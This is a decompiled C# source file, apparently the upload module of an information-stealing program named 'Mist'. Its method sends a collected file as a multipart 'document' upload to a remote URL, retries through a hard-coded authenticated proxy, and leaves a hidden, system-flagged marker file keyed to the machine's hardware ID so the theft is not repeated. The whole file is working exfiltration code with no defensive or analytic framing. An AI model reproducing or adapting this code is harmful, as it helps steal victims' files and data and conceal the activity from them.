using System;
using System.IO;
using System.Net;

namespace Mist
{
	// Token: 0x0200000B RID: 11
	public class SenderAPI
	{
		// Token: 0x06000025 RID: 37 RVA: 0x00006280 File Offset: 0x00004480
		public static void POST(byte[] file, string filename, string contentType, string url)
		{
			try
			{
				try
				{
					ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
					WebClient webClient = new WebClient
					{
						Proxy = null
					};
					string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
					webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
					string @string = webClient.Encoding.GetString(file);
					string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
					{
						text,
						filename,
						contentType,
						@string
					});
					byte[] bytes = webClient.Encoding.GetBytes(s);
					webClient.UploadData(url, "POST", bytes);
					File.AppendAllText(Help.LocalData + "\\" + Help.HWID, Help.HWID + Help.dateLog);
					File.SetAttributes(Help.LocalData + "\\" + Help.HWID, FileAttributes.Hidden | FileAttributes.System);
				}
				catch
				{
					ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
					using (WebClient webClient2 = new WebClient())
					{
						string text2 = "------------------------" + DateTime.Now.Ticks.ToString("x");
						webClient2.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text2);
						string string2 = webClient2.Encoding.GetString(file);
						string s2 = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
						{
							text2,
							filename,
							contentType,
							string2
						});
						byte[] bytes2 = webClient2.Encoding.GetBytes(s2);
						WebProxy proxy = new WebProxy(Program.ip, Program.port)
						{
							Credentials = new NetworkCredential(Program.login, Program.password)
						};
						webClient2.Proxy = proxy;
						webClient2.UploadData(url, "POST", bytes2);
					}
					File.AppendAllText(Help.LocalData + "\\" + Help.HWID, Help.HWID + Help.dateLog);
					File.SetAttributes(Help.LocalData + "\\" + Help.HWID, FileAttributes.Hidden | FileAttributes.System);
				}
				finally
				{
					if (!File.Exists(Help.LocalData + "\\" + Help.HWID))
					{
						Collection.GetCollection();
					}
					else if (!File.ReadAllText(Help.LocalData + "\\" + Help.HWID).Contains(Help.HWID + Help.dateLog))
					{
						Collection.GetCollection();
					}
				}
			}
			catch
			{
				if (!File.Exists(Help.LocalData + "\\" + Help.HWID))
				{
					return;
				}
				File.Delete(Help.LocalData + "\\" + Help.HWID);
			}
		}
	}
}
